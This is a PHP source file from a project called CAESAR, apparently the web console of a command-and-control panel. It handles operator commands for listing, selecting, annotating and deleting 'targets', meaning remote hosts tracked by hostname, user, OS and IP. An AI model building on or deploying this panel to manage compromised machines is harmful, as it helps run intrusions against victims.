<?php

	/*
		CAESAR

		Author : Michele '0blio' Cisternino
		Email  : miki.cisternino@gmail.com
		Github : https://github.com/0blio
	
		This project is released under the GPL 3 license. 	
	*/

				$command = trim($_GET['command']);
				// Rimuovere anche gli spazi eccessivi in mezzo alla parole

				if ($command == 'exit') {
					session_destroy();
					$output = 'exit';

				// Stampare i dati in ordine alfabetico secondo 'description'(provare al lasciare 'exit' come ultimo)
				} else if ($command == 'help') {
					$output = $db -> table ('help') -> eq('category', 'h') -> columns('command', 'description') -> asc('description') -> findAll();
					$output = to_html_table ($output);

				// Funzione per controllare che ci sia una nuova versione del software
				// Funzione per aggiornare il software (abbastanza complessa)
			
				} else if ($command == 'ip') {
					$output = $_SERVER['REMOTE_ADDR'];
					// Add country

				} else if ($command === 'whoami') {
					$output = $_SESSION['username'];

				} else if ($command == 'date') {
					$output = date('d/m/Y, H:i:s');

				// Implementare hash delle password sia qui che al login
				} else if (startswith ($command, 'passwd')) {
					$arguments = get_arguments ('passwd', $command);

					if (count($arguments) == 2) {
						$new_password = $arguments[0];
						$confirm_new_password = $arguments[1];

						if ($new_password == $confirm_new_password) {
							$db -> table ('users') -> eq('username', $_SESSION['username']) -> update (['password' => password_hash($new_password, PASSWORD_BCRYPT)]);
							$output = system_message ('Password updated', 'notification');
						} else {
							$output = system_message ('Non matching passwords', 'error');
						}
					} else {
						$output = 'Usage: passwd NEW_PASSWORD CONFIRM_NEW_PASSWORD';
					}

				} else if ($command == 'targets') {		
					$output = $db->table('targets')->columns('id', 'hostname', 'username', 'os', 'arch', 'ip', 'first_request', 'last_request', 'description')->findAll();

					// If there are some targets
					if (count($output) > 0)
						$output = to_html_table ($output, ['ID', 'Hostname', 'Username', 'OS', 'Arch', 'IP Address', 'First time seen', 'Last request', 'Description']);
					else	
						$output = system_message ('There are no targets', 'notification');

				} else if (startswith ($command, 'select target')) {
					$arguments = get_arguments ('select target', $command);

					if (count($arguments) == 1) {
						$id = $arguments[0];

						if (only_digits($id)) {
							$valid_id = $db -> table ('targets') -> eq ('id', $id) -> exists();
							if ($valid_id) 
								$output = 'selected';
							else 
								$output = system_message ('Invalid ID: ' . htmlspecialchars($id), 'error');
						} else {
							$output = system_message ('Invalid ID: ' . htmlspecialchars($id), 'error');
						}
					} else {
						$output = 'Usage: select target ID';
					}

				} else if (startswith ($command, 'add description')) {
					$arguments = get_arguments ('add description', $command);

					if (count ($arguments) > 1) {
						$id = $arguments[0];

						// If the id is a valid number
						if (only_digits($id)) {

							// Removing id from arguments
							array_shift($arguments);

							// Merging the arguments in order to get description
							$description = implode (" ", $arguments);
					
							$valid_id = $db -> table ('targets') -> eq ('id', $id) -> exists();

							// For some reason update() don't return the number of affected rows
							if ($valid_id) {
								$db -> table ('targets') -> eq('id', $id) -> update (['description' => $description]);
								$output = system_message ('Target ' . $id . ' updated successfully', 'added');
							} else {
								$output = system_message ('Invalid ID: ' . htmlspecialchars($id), 'error');
							}
						} else {
							$output = system_message ('Invalid ID: ' . htmlspecialchars($id), 'error');
						}

					} else {
						$output = 'Usage: add description ID DESCRIPTION';
					}

				} else if (startswith ($command, 'delete target')) {
					$arguments = get_arguments ('delete target', $command);

					if (count($arguments) == 1) {
						$id = $arguments[0];

						if (only_digits($id)) {
							$removed = $db -> table ('targets') -> eq ('id', $id) -> remove();
		
							if ($removed)
								$output = system_message ('Target ' . htmlspecialchars($id) . ' removed successfully', 'removed');
							else
								$output = system_message ('Invalid ID: ' . htmlspecialchars($id), 'error');

						} else if ($id == '*') {
							$removed = $db -> table ('targets') -> remove();
							$output = system_message('All targets removed successfully', 'removed');

						} else {
							$output = system_message ('Invalid ID: ' . htmlspecialchars($id), 'error');
						}
					
					} else {
						$output = 'Usage: delete target ID';
					}

				} else {
					$output = htmlentities($command) . ': Command not found';
				}
